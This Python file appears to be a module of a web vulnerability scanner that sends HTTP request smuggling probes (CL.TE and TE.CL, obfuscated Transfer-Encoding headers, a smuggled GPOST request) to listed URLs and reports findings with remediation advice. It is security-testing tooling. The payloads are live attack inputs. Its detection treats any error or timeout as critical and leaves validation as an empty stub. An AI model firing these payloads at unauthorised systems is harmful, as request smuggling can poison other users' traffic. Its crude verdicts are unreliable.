import os
import json
import asyncio
import aiohttp
from urllib.parse import urlparse
from logger import get_logger

logger = get_logger(__name__)

class SmugglingScanner:
    def __init__(self):
        self.results_dir = "smuggling_results"
        os.makedirs(self.results_dir, exist_ok=True)
        self.cl_te_payloads = [
            {
                'name': 'Basic CL.TE',
                'headers': {
                    'Content-Length': '6',
                    'Transfer-Encoding': 'chunked'
                },
                'body': '0\r\n\r\nX'
            },
            {
                'name': 'Obfuscated TE',
                'headers': {
                    'Content-Length': '6',
                    'Transfer-Encoding': 'chunked',
                    'Transfer-encoding': 'chunked'
                },
                'body': '0\r\n\r\nX'
            }
        ]
        self.te_cl_payloads = [
            {
                'name': 'Basic TE.CL',
                'headers': {
                    'Content-Length': '4',
                    'Transfer-Encoding': 'chunked'
                },
                'body': '5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n'
            },
            {
                'name': 'Chunked with Space',
                'headers': {
                    'Content-Length': '4',
                    'Transfer-Encoding': ' chunked'
                },
                'body': '5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n'
            }
        ]

    async def scan_urls(self, urls):
        """
        Scan multiple URLs for HTTP Request Smuggling vulnerabilities
        """
        try:
            logger.info(f"Starting Request Smuggling scan for {len(urls)} URLs")
            results = {}
            
            async with aiohttp.ClientSession() as session:
                for url in urls:
                    result = await self._scan_url(session, url)
                    if result:
                        results[url] = result
            
            return results
        except Exception as e:
            logger.error(f"Error in Request Smuggling scan: {e}")
            return {}

    async def _scan_url(self, session, url):
        """
        Test a single URL for Request Smuggling vulnerabilities
        """
        try:
            vulnerabilities = []
            
            # Test CL.TE vulnerabilities
            for payload in self.cl_te_payloads:
                try:
                    async with session.post(
                        url,
                        headers=payload['headers'],
                        data=payload['body'],
                        timeout=10
                    ) as response:
                        if response.status in [400, 500, 502]:
                            vulnerabilities.append({
                                'type': 'CL.TE Request Smuggling',
                                'technique': payload['name'],
                                'response_code': response.status,
                                'headers_used': payload['headers'],
                                'severity': 'Critical'
                            })
                except asyncio.TimeoutError:
                    # Timeout might indicate successful smuggling
                    vulnerabilities.append({
                        'type': 'CL.TE Request Smuggling',
                        'technique': payload['name'],
                        'response_code': 'Timeout',
                        'headers_used': payload['headers'],
                        'severity': 'Critical'
                    })
                except Exception as e:
                    logger.error(f"Error testing CL.TE payload: {e}")

            # Test TE.CL vulnerabilities
            for payload in self.te_cl_payloads:
                try:
                    async with session.post(
                        url,
                        headers=payload['headers'],
                        data=payload['body'],
                        timeout=10
                    ) as response:
                        if response.status in [400, 500, 502]:
                            vulnerabilities.append({
                                'type': 'TE.CL Request Smuggling',
                                'technique': payload['name'],
                                'response_code': response.status,
                                'headers_used': payload['headers'],
                                'severity': 'Critical'
                            })
                except asyncio.TimeoutError:
                    vulnerabilities.append({
                        'type': 'TE.CL Request Smuggling',
                        'technique': payload['name'],
                        'response_code': 'Timeout',
                        'headers_used': payload['headers'],
                        'severity': 'Critical'
                    })
                except Exception as e:
                    logger.error(f"Error testing TE.CL payload: {e}")

            if vulnerabilities:
                return {
                    'is_vulnerable': True,
                    'vulnerabilities': vulnerabilities,
                    'recommendations': [
                        "Ensure consistent handling of Transfer-Encoding and Content-Length headers",
                        "Configure front-end servers to reject ambiguous requests",
                        "Implement strict HTTP parsing",
                        "Use consistent web server software across the infrastructure",
                        "Monitor for unusual request patterns",
                        "Consider using HTTP/2 where possible"
                    ],
                    'risk_level': 'Critical',
                    'cwe': 'CWE-444'
                }

            return None

        except Exception as e:
            logger.error(f"Error scanning URL {url}: {e}")
            return None

    def _validate_response(self, response_text, payload):
        """
        Validate if the response indicates a successful smuggling attempt
        """
        # Add custom validation logic based on response patterns
        pass